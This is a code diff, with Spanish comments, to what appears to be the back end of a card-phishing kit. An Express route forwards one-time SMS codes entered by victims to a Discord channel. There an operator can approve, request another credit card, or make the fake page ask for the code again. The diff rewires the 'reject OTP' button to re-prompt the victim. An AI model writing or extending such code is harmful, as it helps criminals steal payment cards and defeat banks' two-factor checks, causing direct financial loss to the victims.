@@ -144,7 +144,7 @@ app.post('/validar-otp/:userId', async (req, res) => {
                 { name: '📱 SMS Recibido', value: `\`${otp}\``, inline: false }
             );
             
-            // 🔥 AQUÍ ESTÁN LOS 3 BOTONES NUEVOS
+            // BOTONES CUANDO LLEGA EL OTP
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
                 new ButtonBuilder().setCustomId(`otracc_${userId}`).setLabel('📱 Pedir otra CC').setStyle(ButtonStyle.Primary),
@@ -191,13 +191,14 @@ client.on('interactionCreate', async (interaction) => {
         sesiones.set(userId, s);
         await interaction.reply({ content: `❌ Usuario rechazado.`, ephemeral: true });
     } 
-    else if (action === 'otracc') { // 🔥 NUEVA ACCIÓN
+    else if (action === 'otracc') { 
         s.estado = 'pedir_otra_cc';
         sesiones.set(userId, s);
         await interaction.reply({ content: `📱 Se solicitó cambiar de tarjeta al usuario.`, ephemeral: true });
     } 
-    else if (action === 'rechazarotp') { // 🔥 NUEVA ACCIÓN
-        s.estado = 'rechazar_otp';
+    else if (action === 'rechazarotp') { 
+        // 🔥 CAMBIO CLAVE AQUÍ: Ahora envía el estado 'pedir_otp' para que el HTML lo detecte de nuevo
+        s.estado = 'pedir_otp'; 
         sesiones.set(userId, s);
         await interaction.reply({ content: `❌ OTP rechazado. Se solicitará de nuevo.`, ephemeral: true });
     }
